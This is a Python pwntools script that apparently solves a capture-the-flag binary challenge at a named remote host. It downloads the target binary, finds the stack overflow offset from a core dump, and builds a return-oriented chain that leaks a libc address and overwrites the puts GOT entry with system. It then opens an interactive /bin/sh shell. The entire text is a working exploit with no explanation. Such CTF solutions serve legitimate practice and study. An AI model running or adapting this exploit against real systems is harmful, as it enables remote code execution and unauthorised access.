from pwn import *
from Crypto.Util.number import *
import os

# nc challs.xmas.htsp.ro 12002

libc = ELF('libc.so.6')
system = libc.symbols['system']
bin_sh = libc.search("/bin/sh").next()


conn = remote("challs.xmas.htsp.ro", 12002)
conn.recvuntil("Content: b'")

binary = conn.recvuntil("'").strip("'").decode('base64')
f = open("chall", "wb")
f.write(binary)
f.close()
os.system("chmod +x chall")

elf = context.binary =  ELF("chall")

libc_start_main_got = elf.got['__libc_start_main']
puts = elf.plt['puts']
gets = elf.plt['gets']
puts_got = elf.got['puts']
bss = elf.bss()

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
# context.log_level = 'debug'

io = process(elf.path, env = {'LD_PRELOAD':'./libc.so.6'})

io.sendline(cyclic(1024))

io.wait()
io.close()
core = io.corefile

stack = core.rsp

# info("%#x stack",stack)
pattern = core.read(stack, 8)
# print(pattern)

# info("%r pattern", pattern)

offset = cyclic(1024).find(pattern)
info("offset = %#x", offset)
log.info('__libc_start_main@got = ' + hex(libc_start_main_got))

# gdb.attach(io, '''
# break *
# )

pad = "a"*offset

payload = pad + p64(pop_rdi) + p64(libc_start_main_got) + p64(puts)
payload += p64(pop_rdi) + p64(bss + 8) + p64(gets) + p64(pop_rdi)
payload += p64(puts_got) + p64(gets) + p64(pop_rdi) + p64(bss + 8)
payload += p64(puts)

# io = process(elf.path)
io = conn
io.recvuntil("What's your name? ")
io.sendline(payload)

print(io.recvuntil("\n"))
print(io.recvuntil("\n"))

libc_start_main = bytes_to_long(io.recv(numb = 8).strip("\n")[::-1])
libc_base = libc_start_main - libc.symbols['__libc_start_main']

log.info("libc_base = " + hex(libc_base))
# io.interactive()
system = system + libc_base
io.sendline("/bin/sh")
io.sendline(p64(system))

io.interactive()


